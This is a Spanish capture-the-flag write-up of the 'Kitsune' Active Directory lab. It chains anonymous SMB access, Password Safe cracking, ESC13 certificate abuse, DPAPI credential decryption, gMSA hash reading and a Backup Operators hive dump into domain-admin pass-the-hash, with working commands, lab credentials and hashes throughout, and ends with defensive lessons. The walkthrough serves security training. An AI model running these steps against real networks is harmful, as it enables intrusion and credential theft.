# Writeup: Kitsune (Hack Smarter — Fácil)

Kitsune es una máquina **Fácil** de Active Directory sobre **Windows Server 2025** que modela un entorno corporativo con una cadena de escalada encadenada: el compromiso comienza con una **sesión SMB anónima** que otorga lectura sobre el share `Files`, donde un **gestor de contraseñas `.psafe3`** mal protegido se crackea con Hashcat para obtener las credenciales del usuario `ranch`. A partir de ahí, se descubre una **CA Enterprise** con una plantilla vulnerable a **ESC13**, que se explota para obtener un TGT con el **SID del grupo `HelpDesk`** en el PAC. Ese grupo tiene **GenericAll** sobre `schlop`, cuyo perfil contiene un archivo `.cred` cifrado con **DPAPI** que entrega la contraseña de `pebble`. Este usuario pertenece al grupo `IT`, con **`ReadGMSAPassword`** sobre `svc_gmsa$`, y esa gMSA es miembro de **Backup Operators**, lo que permite volcar **SAM/SYSTEM/SECURITY** y obtener el hash del `Administrator` del dominio, comprometiéndolo por completo.

---

## Fase 1: Reconocimiento

Escaneo de puertos inicial:

```bash
sudo nmap -sS -p- --min-rate 500 -Pn -n -vv 10.1.130.105 -oG allPorts
```

**Resultado (extracto):**

```
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 126
88/tcp    open  kerberos-sec     syn-ack ttl 126
135/tcp   open  msrpc            syn-ack ttl 126
139/tcp   open  netbios-ssn      syn-ack ttl 126
389/tcp   open  ldap             syn-ack ttl 126
445/tcp   open  microsoft-ds     syn-ack ttl 126
464/tcp   open  kpasswd5         syn-ack ttl 126
593/tcp   open  http-rpc-epmap   syn-ack ttl 126
636/tcp   open  ldapssl          syn-ack ttl 126
3268/tcp  open  globalcatLDAP    syn-ack ttl 126
3269/tcp  open  globalcatLDAPssl syn-ack ttl 126
3389/tcp  open  ms-wbt-server    syn-ack ttl 126
5985/tcp  open  wsman            syn-ack ttl 126
...
```

Escaneo de versiones:

```bash
nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,49664,49666,49673,49674,49693,49729,49734,49823 10.1.130.105 -oN targeted
```

**Resultado (extracto):**

```
Host: DC01; OS: Windows
Domain: kitsune.local
Product_Version: 10.0.26100   ← Windows Server 2025
smb2-security-mode:
   3.1.1: Message signing enabled and required
```

**Observaciones clave:**

- Dominio `kitsune.local`, DC `DC01.kitsune.local`.
- **Windows Server 2025** (build 26100).
- **SMB signing requerido** → descartamos NTLM relay.
- **RDP (3389) y WinRM (5985)** abiertos → posibles shells interactivas.
- **Sin clock skew** reseñable (2s) → Kerberos utilizable directamente.

---

## Fase 2: Enumeración SMB anónima y crackeo del gestor de contraseñas

### 2.1 Null authentication

El banner SMB indicaba `Null Auth: True`. Probamos sesión anónima contra el DC:

```bash
nxc smb kitsune.local -u 'guest' -p '' --shares
```

**Resultado:**

```
SMB  DC01  [+] kitsune.local\guest:
SMB  DC01  Share           Permissions     Remark
SMB  DC01  -----           -----------     ------
SMB  DC01  ADMIN$                          Remote Admin
SMB  DC01  C$                              Default share
SMB  DC01  Files           READ            Global file share
SMB  DC01  IPC$            READ            Remote IPC
SMB  DC01  NETLOGON                        Logon server share
SMB  DC01  SYSVOL                          Logon server share
```

**Hallazgo:** el servidor permite autenticación anónima (`Null Auth: True`) y la sesión de invitado tiene acceso de **lectura** al share `Files`.

### 2.2 Descarga del contenido del share `Files`

```bash
smbclient //kitsune.local/Files -U 'guest%'
```

```
smb: \> ls
  10-11-Calendar_October.pdf          A     3190
  10-11-Financial_Report.pdf          A     4076
  10-11-Timesheet.pdf                 A     3854
  logins.psafe3                       A      840
```

```bash
smb: \> get logins.psafe3
```

```bash
file logins.psafe3
# logins.psafe3: Password Safe V3 database
```

`logins.psafe3` es la base de datos del gestor **Password Safe V3**. Contiene las entradas cifradas con una contraseña maestra y un esquema de derivación de clave (SHA-256 iterado + Twofish-CBC), por lo que no puede abrirse sin la master password. Sin embargo, sí es susceptible de crackeo offline.

### 2.3 Crackeo del `.psafe3`

Hashcat dispone de un modo específico para Password Safe v3 (`-m 5200`):

```bash
hashcat -m 5200 -a 0 logins.psafe3 /usr/share/wordlists/rockyou.txt
```

**Resultado:**

```
logins.psafe3:hellokitty
Status...........: Cracked
Hash.Mode........: 5200 (Password Safe v3)
Recovered........: 1/1 (100.00%) Digests
```

La contraseña maestra era `hellokitty` — claramente débil. El KDF de Password Safe V3 (327.680 iteraciones de SHA-256 + Twofish-CBC) está implementado en GPU por Hashcat, lo que permite probar candidatos a millones por segundo.

### 2.4 Credenciales extraídas y validación

Abrimos la base con `pwsafe` y la contraseña maestra, obteniendo tres entradas:

```
admin:I#zmE{z[n3HM
ranch:R@nch2026!
root:a%KlRhqbuRgL
```

Validamos las tres contra el dominio. Únicamente `ranch:R@nch2026!` resulta válida; las entradas `admin` y `root` no corresponden a cuentas del dominio (probablemente credenciales locales u de otros sistemas).

---

## Fase 3: Enumeración del dominio como `ranch`

### 3.1 Usuarios y shares

```bash
nxc smb kitsune.local -u 'ranch' -p 'R@nch2026!' --users
```

**Resultado (extracto):**

```
Administrator   2026-10-12 20:49:49  1
Guest           <never>             0
krbtgt          2026-10-12 08:21:41  0
ranch           2026-10-12 20:49:29  0
schlop          2026-10-18 04:01:44  0   schlop show
pebble          2026-10-13 02:36:32  0
ross            2026-10-13 00:36:27  0
protagonist     2026-10-13 00:37:06  0
```

```bash
nxc smb kitsune.local -u 'ranch' -p 'R@nch2026!' --shares
```

**Resultado (extracto):**

```
Files   READ,WRITE   Global file share
```

**Observaciones:**

- `ranch` ahora dispone de **READ,WRITE** sobre `Files`.
- Usuarios relevantes por nombre o descripción: **`schlop`** (descripción "schlop show"), `pebble`, `protagonist`.

### 3.2 Hipótesis de reutilización por marcas de tiempo

La marca de tiempo de `ranch` (20:49:29) y la de `Administrator` (20:49:49) están separadas por apenas 20 segundos, lo que sugiere un aprovisionamiento en lote con una contraseña inicial compartida. Probamos a reutilizar la contraseña de `ranch` contra `Administrator`, pero la autenticación falló. La proximidad temporal, por tanto, no implicaba reutilización en este caso, y la vía se descartó.

---

## Fase 4: Descubrimiento de AD CS mediante BloodHound

### 4.1 El modelo de AD CS en BloodHound

BloodHound (5+) modela la infraestructura de AD CS como parte del grafo de dominio. Los elementos relevantes son:

- **Nodos `EnterpriseCA`**: cada CA enterprise del bosque.
- **Nodos `CertTemplate`**: cada plantilla publicada.
- **Aristas** entre usuarios/grupos y esos nodos: `Enroll`, `ManageCA`, `ManageCertificates`, `WritePKI`, `Owns`, entre otras.

Cuando un usuario tiene la arista **`Enroll`** sobre una CA o plantilla, BloodHound lo representa como un camino directo hacia la emisión de certificados, lo que a su vez es un vector de escalada si la plantilla es vulnerable.

### 4.2 Hallazgos en Kitsune

La recolección de BloodHound reveló que `ranch` tiene permisos **`Enroll`** sobre una CA Enterprise llamada `KITSUNE-DC01-CA@KITSUNE.LOCAL`. Esta arista, combinada con la existencia de plantillas publicadas, activa la vía AD CS como vector prioritario.

BloodHound también mostró que el grupo **`HelpDesk`** tiene **GenericAll** sobre el usuario `schlop`. Esto convierte a `HelpDesk` en el objetivo intermedio de la escalada: si logramos obtener los privilegios de `HelpDesk`, comprometemos `schlop` y, con ello, el perfil del usuario (objetivo que se materializó posteriormente en la Fase 8).

---

## Fase 5: Análisis de la plantilla `Kitsune-User` — ESC13

### 5.1 Enumeración con `certipy find`

Con la CA identificada, enumeramos plantillas y aplicamos la base de datos de vulnerabilidades ESC1–ESC17:

```bash
certipy-ad find -target dc01.kitsune.local -u ranch -p 'R@nch2026!' -stdout -vulnerable
```

**Resultado (extracto relevante):**

```
Certificate Authorities
  0
    CA Name                             : kitsune-DC01-CA
    DNS Name                            : DC01.kitsune.local
    ...
    Permissions
      Access Rights
        Enroll                          : KITSUNE.LOCAL\Authenticated Users

Certificate Templates
  0
    Template Name                       : Kitsune-User
    Enabled                             : True
    Client Authentication               : True
    Enrollee Supplies Subject           : False
    Extended Key Usage                  : Client Authentication, Secure Email, EFS
    Requires Manager Approval           : False
    Authorized Signatures Required      : 0
    Issuance Policies                   : 1.3.6.1.4.1.311.21.8.10863307...
    Linked Groups                       : CN=HelpDesk,CN=Users,DC=kitsune,DC=local
    Permissions
      Enrollment Permissions
        Enrollment Rights               : KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Domain Users
                                          KITSUNE.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : KITSUNE.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC13                             : Template allows client authentication and issuance policy is linked to group 'CN=HelpDesk,CN=Users,DC=kitsune,DC=local'.
```

`certipy` emitió advertencias de resolución DNS durante la comprobación de *web enrollment*, pero la enumeración vía RRP se completó con éxito.

### 5.2 Campos relevantes del output

| Campo | Valor | Implicación |
|---|---|---|
| `Client Authentication` | `True` | Permite PKINIT → obtención de TGT |
| `Enrollee Supplies Subject` | `False` | No aplica ESC1 (no se controla el SAN) |
| `Enrollment Rights` | incluye `Domain Users` | `ranch` puede solicitar certificado |
| `Issuance Policies` | `1.3.6.1.4.1.311.21.8.10863307...` | OID incrustado en el certificado |
| `Linked Groups` | `CN=HelpDesk` | Ese OID está vinculado al grupo `HelpDesk` |
| `ESC13` | reportado por certipy | Confirmación de la cadena |

### 5.3 Mecánica de ESC13

**AD CS** emite certificados X.509 basados en **plantillas**. Una plantilla define quién puede solicitar el certificado (*Enrollment Rights*), qué **EKU** (Extended Key Usage) tendrá, si el solicitante puede especificar el Subject/SAN, y opcionalmente una **Issuance Policy**: un OID que la CA incluye dentro del certificado al emitirlo.

Desde **Windows Server 2016** (y reforzado en **Windows Server 2025**), AD permite **vincular un OID a un grupo de seguridad** mediante el atributo `msDS-OIDToGroupLink` dentro del contenedor `CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=...`.

Cuando un usuario se autentica con Kerberos usando un certificado que contiene ese OID, el **KDC consulta el link**, resuelve el grupo asociado y **añade su SID al PAC** (Privilege Attribute Certificate) del TGT. La autorización se evalúa contra el PAC, no contra la pertenencia real a grupos.

**Condiciones para ESC13:**

1. Plantilla habilitada con EKU **Client Authentication**.
2. El atacante puede enrolar en la plantilla.
3. La plantilla tiene una Issuance Policy vinculada a un grupo con privilegios.
4. No se exige aprobación del manager ni firmas autorizadas.

En Kitsune, la plantilla `Kitsune-User` cumple las cuatro condiciones. A diferencia de ESC1, **no hay suplantación de identidad**: el certificado es legítimamente del solicitante, pero la Issuance Policy otorga los privilegios del grupo `HelpDesk` durante la autenticación Kerberos.

---

## Fase 6: Explotación de ESC13

### 6.1 Solicitud del certificado

Solicitamos un certificado con la plantilla vulnerable:

```bash
certipy-ad req -target dc01.kitsune.local -u ranch -p 'R@nch2026!' -template KITSUNE-USER -ca KITSUNE-DC01-CA -key-size 4096
```

**Resultado:**

```
[*] Request ID is 20
[*] Successfully requested certificate
[*] Got certificate with UPN 'ranch@kitsune.local'
[*] Certificate object SID is 'S-1-5-21-3773590124-4237107295-2360938966-1103'
[*] Saving certificate and private key to 'ranch.pfx'
```

El resultado es un contenedor **PKCS#12** (`.pfx`) que incluye el certificado y la clave privada. El certificado incorpora dos elementos clave:

- Extensión `szOID_NTDS_CA_SECURITY_EXT` con el SID de `ranch` (`S-1-5-21-...-1103`), que identifica al titular en AD.
- El **OID de la Issuance Policy** vinculada al grupo `HelpDesk`.

### 6.2 Autenticación PKINIT

```bash
certipy-ad auth -pfx ranch.pfx -domain kitsune.local -dc-ip 10.1.130.105
```

**Resultado:**

```
[*] Certificate identities:
[*]     SAN UPN: 'ranch@kitsune.local'
[*]     Security Extension SID: 'S-1-5-21-3773590124-4237107295-2360938966-1103'
[*] Using principal: 'ranch@kitsune.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ranch.ccache'
[*] Trying to retrieve NT hash for 'ranch'
[*] Got hash for 'ranch@kitsune.local':
    aad3b435b51404eeaad3b435b51404ee:47d29308446189faa2acec65586963c1
```

El flujo interno de `certipy auth` es el siguiente:

1. Presenta el certificado al KDC en una AS-REQ firmada con la clave privada (**PKINIT**).
2. El KDC valida el certificado, extrae el OID de la Issuance Policy, consulta el `msDS-OIDToGroupLink` y **añade el SID de `HelpDesk` al PAC** del TGT.
3. Devuelve el TGT en formato `.ccache`.
4. Ejecuta **UnPAC-the-hash**: descifra la parte del PAC con el hash NTLM del titular y lo imprime.

El resultado es un `.ccache` cuyo PAC contiene el SID de `HelpDesk`, aunque `ranch` no sea miembro real del grupo.

### 6.3 Activación del `.ccache` y verificación

```bash
export KRB5CCNAME=ranch.ccache
```

Enumeramos los permisos evaluados contra el PAC del ticket:

```bash
bloodyad --host dc01.kitsune.local -k -d kitsune.local get writable
```

**Resultado:**

```
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=kitsune,DC=local
permission: WRITE

distinguishedName: CN=ranch,CN=Users,DC=kitsune,DC=local
permission: WRITE

distinguishedName: CN=schlop,CN=Users,DC=kitsune,DC=local
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: DC=kitsune.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=kitsune,DC=local
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.kitsune.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=kitsune,DC=local
permission: CREATE_CHILD
```

`bloodyAD` evalúa los permisos contra el PAC del ticket, que ya contiene el SID de `HelpDesk`. Por eso aparecen los permisos de `HelpDesk` sobre `schlop` (`CREATE_CHILD`, `WRITE`, `OWNER: WRITE`, `DACL: WRITE`), confirmando la escalada efectiva.

---

## Fase 7: Abuso de `HelpDesk` — Compromiso de `schlop`

Aprovechando el control total sobre `schlop`, forzamos un cambio de contraseña:

```bash
bloodyad --host dc01.kitsune.local -k -d kitsune.local set password schlop 'Password123!'
```

**Resultado:**

```
[+] Password changed successfully!
```

La operación se autoriza porque el PAC del TGT contiene el SID de `HelpDesk`, y `HelpDesk` dispone de `DACL: WRITE` y `OWNER: WRITE` sobre `schlop`. El DC evalúa los permisos contra el PAC, no contra la pertenencia real a grupos. Este es el punto donde la mecánica de ESC13 se materializa en una escalada concreta.

Verificamos el acceso:

```bash
nxc smb kitsune.local -u 'schlop' -p 'Password123!' --shares
```

```
SMB  [+] kitsune.local\schlop:Password123!
SMB  Share           Permissions
SMB  Files           READ,WRITE
```

```bash
nxc winrm kitsune.local -u 'schlop' -p 'Password123!'
```

```
WINRM [+] kitsune.local\schlop:Password123! (Pwn3d!)
```

`(Pwn3d!)` en WinRM indica que `schlop` pertenece a `Remote Management Users` (o `Administrators`), permitiendo shell interactiva.

---

## Fase 8: Credencial DPAPI en el perfil de `schlop`

### 8.1 Enumeración del perfil

```powershell
*Evil-WinRM* PS C:\Users\schlop\Documents> ls
```

**Resultado:**

```
    Directory: C:\Users\schlop\Documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/13/2026   2:37 AM           1770 networkAuth.cred
```

```powershell
*Evil-WinRM* PS C:\Users\schlop\Documents> type "C:/Users/schlop/Documents/networkAuth.cred"
```

**Resultado (extracto):**

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">pebble</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb0100...</SS>
    </Props>
  </Obj>
</Objs>
```

El archivo es un objeto `PSCredential` serializado con `Export-CliXml`. El campo `Password` está cifrado con **DPAPI**, usando la master key del usuario que exportó el archivo (`schlop`). DPAPI vincula el cifrado al perfil del usuario, de modo que:

- Cualquier otro usuario que intente `Import-CliXml` obtendrá un error de descifrado.
- El propio `schlop` (o quien haya robado su master key) puede descifrarlo.

### 8.2 Descifrado en el contexto de `schlop`

Dado que la shell está en el contexto de `schlop`, la importación y extracción del secreto se realizan directamente:

```powershell
*Evil-WinRM* PS C:\Users\schlop\Documents> $cred= Import-CliXml -Path "networkAuth.cred"
*Evil-WinRM* PS C:\Users\schlop\Documents> $cred.GetNetworkCredential().Password
```

**Resultado:**

```
PebbleIs47!
```

Credencial del usuario **`pebble`** obtenida. Los archivos `.cred` en perfiles de usuario constituyen un vector de movimiento lateral directo cuando el atacante opera en el contexto del usuario que los exportó: el descifrado DPAPI no requiere herramientas externas, solo `Import-CliXml`.

### 8.3 Validación

```bash
nxc smb kitsune.local -u 'pebble' -p 'PebbleIs47!' --shares
```

```
SMB  [+] kitsune.local\pebble:PebbleIs47!
SMB  Share           Permissions
SMB  Files           READ,WRITE
```

---

## Fase 9: Lectura de gMSA como `pebble`

### 9.1 Contexto desde BloodHound

La recolección con BloodHound reveló que:

- `pebble` pertenece al grupo **`IT`**.
- El grupo **`IT`** tiene la arista **`ReadGMSAPassword`** sobre la cuenta de servicio **`svc_gmsa$`**.
- `svc_gmsa$` pertenece al grupo **`Backup Operators`**.

Una **gMSA** (group Managed Service Account) es una cuenta de servicio cuya contraseña es gestionada por AD automáticamente (rotación cada 30 días, 240 caracteres). El hash se almacena en el atributo `msDS-ManagedPassword`, y solo los principales listados en `msDS-GroupMSAMembership` (`PrincipalsAllowedToReadPassword`) pueden leerlo. Estar en ese grupo equivale a disponer del hash de la gMSA, utilizable directamente vía Pass-the-Hash sin conocer la contraseña en claro.

### 9.2 Extracción del hash

`nxc` incluye un módulo específico para gMSA:

```bash
nxc ldap kitsune.local -u 'pebble' -p 'PebbleIs47!' --gmsa
```

**Resultado:**

```
LDAP  [+] kitsune.local\pebble:PebbleIs47!
LDAP  [*] Getting GMSA Passwords
LDAP  Account: svc_gmsa$   NTLM: b8696283f6628ac0ccee1434a519ba06
      PrincipalsAllowedToReadPassword: IT
```

El atributo `PrincipalsAllowedToReadPassword` (internamente `msDS-GroupMSAMembership`) contiene al grupo `IT`. Por eso `pebble`, como miembro de `IT`, puede leer el hash de la gMSA. La seguridad de una gMSA depende exclusivamente de la composición de ese grupo; incluir grupos amplios (como `IT` completo) multiplica innecesariamente la superficie.

### 9.3 Pass-the-Hash como `svc_gmsa$`

```bash
nxc smb kitsune.local -u 'svc_gmsa$' -H b8696283f6628ac0ccee1434a519ba06 --shares
```

**Resultado:**

```
SMB  [+] kitsune.local\svc_gmsa$:b8696283f6628ac0ccee1434a519ba06
SMB  Share           Permissions
SMB  ADMIN$          READ
SMB  C$              READ,WRITE
SMB  Files           READ,WRITE
SMB  IPC$            READ
SMB  NETLOGON        READ
SMB  SYSVOL          READ
```

`svc_gmsa$` dispone de **READ sobre `ADMIN$`** y **READ,WRITE sobre `C$`**, privilegios compatibles con su pertenencia a **Backup Operators**.

---

## Fase 10: Backup Operators — Volcado de SAM, SYSTEM y SECURITY

### 10.1 Contexto técnico

**`Backup Operators`** es un grupo de Windows que otorga a sus miembros los privilegios:

- **`SeBackupPrivilege`**: leer cualquier archivo del sistema **ignorando ACLs**.
- **`SeRestorePrivilege`**: escribir cualquier archivo **ignorando ACLs**.

Las colmenas `SAM`, `SYSTEM` y `SECURITY` del registro están en `C:\Windows\System32\config\` y normalmente bloqueadas para lectura directa. `SeBackupPrivilege` permite **saltarse la ACL** y copiarlas. Con esas colmenas se extrae:

- **SAM**: hashes de cuentas locales.
- **SYSTEM**: bootkey necesaria para descifrar SAM.
- **SECURITY**: LSA secrets (contraseñas de servicios, tickets, etc.).

En un **Domain Controller**, la cuenta local `Administrator` del SAM **coincide con la del dominio**. Por eso dumpear SAM en un DC **equivale a obtener el hash del `Administrator` del dominio**. `Backup Operators` es, en un DC, un grupo **de facto Tier-0**.

### 10.2 Volcado mediante el módulo de `nxc`

```bash
nxc smb kitsune.local -u 'svc_gmsa$' -H b8696283f6628ac0ccee1434a519ba06 -M backup_operator
```

**Resultado (extracto):**

```
BACKUP_O...  [*] Triggering RemoteRegistry to start through named pipe...
BACKUP_O...  Saved HKLM\SAM to \\10.1.130.105\SYSVOL\SAM
BACKUP_O...  Saved HKLM\SYSTEM to \\10.1.130.105\SYSVOL\SYSTEM
BACKUP_O...  Saved HKLM\SECURITY to \\10.1.130.105\SYSVOL\SECURITY
BACKUP_O...  [*] Copying "SAM" to "/home/kali/.nxc/logs/DC01_10.1.130.105_2026-11-12_223817.SAM"
BACKUP_O...  [+] File "SAM" was downloaded to "/home/kali/.nxc/logs/..."
BACKUP_O...  [*] Copying "SECURITY" to "/home/kali/.nxc/logs/..."
BACKUP_O...  [+] File "SECURITY" was downloaded to "..."
BACKUP_O...  [*] Copying "SYSTEM" to "/home/kali/.nxc/logs/..."
BACKUP_O...  [+] File "SYSTEM" was downloaded to "..."
BACKUP_O...  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dffec5d0dda0cbc8bf571471641e001:::
```

El módulo realiza el siguiente flujo:

1. Inicia el servicio **RemoteRegistry** vía SMB named pipe, aprovechando el privilegio heredado de `Backup Operators`.
2. Exporta las colmenas `HKLM\SAM`, `HKLM\SYSTEM` y `HKLM\SECURITY` mediante `reg save` a un share legible por el atacante (en este caso `SYSVOL`).
3. Descarga los archivos.
4. Parsea las colmenas con `impacket` y extrae los hashes.

El privilegio de lectura proviene del grupo `Backup Operators` del usuario autenticado; el módulo solo se aprovecha de él.

### 10.3 Hash del Administrador

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dffec5d0dda0cbc8bf571471641e001:::
```

- **RID 500** → cuenta `Administrator`.
- **NT hash**: `2dffec5d0dda0cbc8bf571471641e001`.

En un DC, la cuenta `Administrator` del SAM **coincide con la del dominio**, por lo que este hash sirve para autenticarse como `kitsune.local\administrator`.

---

## Fase 11: Pass-the-Hash como Administrator — Dominio comprometido

```bash
nxc smb kitsune.local -u 'administrator' -H 2dffec5d0dda0cbc8bf571471641e001
```

**Resultado:**

```
SMB  [+] kitsune.local\administrator:2dffec5d0dda0cbc8bf571471641e001 (Pwn3d!)
```

La marca `(Pwn3d!)` con `administrator` y hash en un DC confirma el **compromiso total del dominio**. Desde este punto es posible acceder a `C$`, `ADMIN$`, ejecutar comandos, volcar `NTDS.dit` con `secretsdump.py` para obtener **todos** los hashes del dominio y establecer persistencia.

---

## 📌 Conclusión

1. **Reconocimiento** → DC WS2025, dominio `kitsune.local`, SMB signing requerido, `Null Auth: True`.
2. **Null authentication en SMB** → lectura anónima del share `Files`.
3. **Crackeo del `.psafe3`** con Hashcat (`-m 5200`) → contraseña maestra `hellokitty` → credenciales de `ranch`.
4. **Enumeración de AD como `ranch`** → acceso de escritura a `Files`, listado de usuarios relevantes (`schlop`, `pebble`, `protagonist`). Hipótesis de reutilización por timestamp descartada.
5. **BloodHound** → identificación de la CA `KITSUNE-DC01-CA` con arista `Enroll` para `ranch` y del grupo `HelpDesk` con `GenericAll` sobre `schlop`.
6. **`certipy find -vulnerable`** → plantilla `Kitsune-User` vulnerable a **ESC13**, con Issuance Policy vinculada a `HelpDesk`.
7. **Explotación de ESC13** → certificado con OID de `HelpDesk` → TGT con SID de `HelpDesk` en el PAC.
8. **Abuso de `HelpDesk`** → cambio de contraseña de `schlop` → shell WinRM con `(Pwn3d!)`.
9. **Credencial DPAPI** en `networkAuth.cred` → contraseña de `pebble`.
10. **Lectura de gMSA** vía `ReadGMSAPassword` del grupo `IT` → NT hash de `svc_gmsa$`.
11. **Abuso de Backup Operators** → volcado de `SAM`/`SYSTEM`/`SECURITY` → hash del `Administrator` del dominio.
12. **Pass-the-Hash** como `kitsune.local\administrator` → **dominio comprometido**.

---

## 📚 Lecciones aprendidas

1. **La null authentication sigue activa en entornos reales**  
   Restauraciones, GPOs heredadas y configuraciones legacy pueden reactivar sesiones anónimas. Auditar `RestrictAnonymous` / `RestrictAnonymousSAM` y el permiso del grupo `Anonymous Logon` sobre shares.

2. **Los gestores de contraseñas en shares accesibles deben considerarse comprometidos**  
   Un `.psafe3`, `.kdbx` o `.1pux` en un share de red es susceptible de crackeo offline. La contraseña maestra debe ser robusta, rotarse y nunca almacenarse en shares de red.

3. **AD CS es un objetivo de primer nivel**  
   `certipy find -vulnerable` debe ejecutarse siempre que exista una CA Enterprise. ESC1, ESC8, ESC13 y variantes son vectores explotables en producción. Auditar plantillas, Issuance Policies y `msDS-OIDToGroupLink`.

4. **ESC13: el PAC prevalece sobre la pertenencia real a grupos**  
   Un certificado con una Issuance Policy vinculada a un grupo otorga los privilegios de ese grupo durante la autenticación Kerberos. La revisión de `msDS-OIDToGroupLink` en `CN=OID,CN=Public Key Services` es parte del hardening de AD CS.

5. **Los archivos `.cred` exportados con DPAPI son credenciales descifrables en el contexto del usuario**  
   Si se obtiene shell como el usuario que exportó el archivo, el descifrado no requiere herramientas externas. Prohibir el uso de `Export-CliXml` para credenciales en perfiles de usuario, o protegerlos con un segundo factor.

6. **`ReadGMSAPassword` sobre grupos amplios es equivalente a la exposición del hash**  
   Incluir `IT` o `Domain Users` en `PrincipalsAllowedToReadPassword` de una gMSA expone el hash de la cuenta de servicio a todo el grupo. Limitar la lista a los hosts concretos que la consumen.

7. **`Backup Operators` es equivalente a Domain Admin en un DC**  
   `SeBackupPrivilege` permite leer `SAM`/`SYSTEM`/`SECURITY`, y en un DC el `Administrator` del SAM coincide con el del dominio. Tratar `Backup Operators` como grupo Tier-0 y restringir su composición.

8. **El Pass-the-Hash con hash de Administrator compromete todo el dominio**  
   Un único hash (SAM de un DC, backup de VM, etc.) puede otorgar control total. Rotar la contraseña de `Administrator` periódicamente y no reutilizarla entre equipos.

9. **BloodHound + `certipy` es el flujo estándar para AD CS**  
   BloodHound identifica la CA y las aristas `Enroll`; `certipy find -vulnerable` identifica la plantilla concreta (ESC13 en este caso) y el grupo vinculado. Ambas herramientas son complementarias.

10. **El orden de los pivotes y la validación de credenciales son críticos**  
    Cada credencial o hash debe validarse antes de continuar. La cadena de Kitsune depende de entender que `ranch` no es `HelpDesk` hasta que usa el certificado, y que el PAC es la fuente de autorización.
